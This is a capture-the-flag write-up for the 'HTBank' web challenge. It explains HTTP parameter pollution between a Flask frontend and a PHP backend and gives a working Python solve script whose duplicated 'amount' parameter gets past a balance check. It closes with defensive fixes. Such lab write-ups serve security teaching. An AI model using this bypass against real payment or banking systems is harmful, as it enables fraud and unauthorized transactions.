## Overview

**HTBank** is an Easy Web challenge. The app is split into two tiers that share
one HTTP request: a **Flask** frontend that authenticates you and validates a
withdrawal, and a **PHP** backend that performs the privileged action. The two
frameworks disagree about how to parse a *duplicated* POST parameter, and that
disagreement is the whole bug — a classic case of
[HTTP Parameter Pollution](https://cwe.mitre.org/data/definitions/235.html)
([CWE-235](https://cwe.mitre.org/data/definitions/235.html)).

## The technique

New accounts start with a balance of `0`, and the bank only releases the flag
when someone withdraws exactly `1337`. The Flask frontend gates the request:

```python
amount = request.form.get('amount', '')          # reads the FIRST 'amount'
if (int(user[0].get('balance')) < int(amount) or int(amount) < 0):
    return response('Not enough credits!'), 400
res = requests.post(f"http://{PHP_HOST}/api/withdraw",
    headers={"content-type": request.headers.get("content-type")},
    data=request.get_data())                       # forwards the RAW body verbatim
```

With a balance of `0` the only value Flask accepts is `0` (both `0 < amount` and
`amount < 0` must be false). It then forwards the **raw, untouched body** to the
PHP backend, which is where the action happens:

```php
$amount = $_POST['amount'];                        // reads the LAST 'amount'
if ($amount == 1337) {
    $this->database->query('UPDATE flag set show_flag=1');
}
```

`request.form.get()` (Werkzeug) returns the **first** occurrence of a duplicated
parameter; PHP's `$_POST` returns the **last**. Send the parameter twice and the
validating tier and the executing tier read *different values*:

| Body | Flask `request.form.get` | PHP `$_POST` |
|------|--------------------------|--------------|
| `amount=0&amount=1337` | `0` (first) | `1337` (last) |

Flask validates `0` and waves it through; the raw body still carries both values,
so PHP acts on `1337`, sets `show_flag=1`, and the next visit to `/home` renders
the flag.

## Solution

Register, log in (the session cookie carries the JWT), then send the polluted
withdrawal and read the flag off the home page.

Create `solve.py`:

```python
import re, sys, requests
base = sys.argv[1].rstrip('/')
u = p = 'pwn_htbank'
s = requests.Session()
s.post(f'{base}/api/register', data={'username': u, 'password': p})
s.post(f'{base}/api/login',    data={'username': u, 'password': p})   # sets session cookie

# Duplicate amount: Flask validates the first (0), PHP acts on the last (1337).
s.post(f'{base}/api/withdraw',
       data='amount=0&amount=1337&account=anything',
       headers={'content-type': 'application/x-www-form-urlencoded'})

r = s.get(f'{base}/home')
print(re.search(r'HTB\{[^}]+\}', r.text).group(0))
```

Run it against the live instance:

```bash
python3 solve.py http://<host>:<port>
```

```
[*] login: {'message': 'Logged in successfully!'}
[*] withdraw: {'message': 'OK'}
[+] FLAG: HTB{...}
```

## Why it worked

When one component *validates* a request and a *different* component *executes*
it, any parsing disagreement between them is a trust-boundary failure. Here the
frontend "sanitised" a value — the first `amount` — that the backend never
actually used. PHP keeps the last duplicate; Flask/Werkzeug, Express, and Java
servlets keep the first. Forwarding the raw client body instead of re-serializing
only the validated value is what let those two views drift apart.

## Fix / defense

- **Don't forward the raw body.** Re-serialize the request from the values the
  frontend actually parsed (`requests.post(..., data={'amount': amount})`) so both
  tiers see the same `amount`.
- **Reject duplicate parameters** at the edge — a security-relevant field should
  appear exactly once.
- **Validate at the tier that performs the action.** The PHP backend should
  re-check authorization and balance rather than trusting that the proxy did.
- Avoid loose comparison (`==`) on security gates; an explicit integer cast plus
  `===` removes the type-juggling slack too.
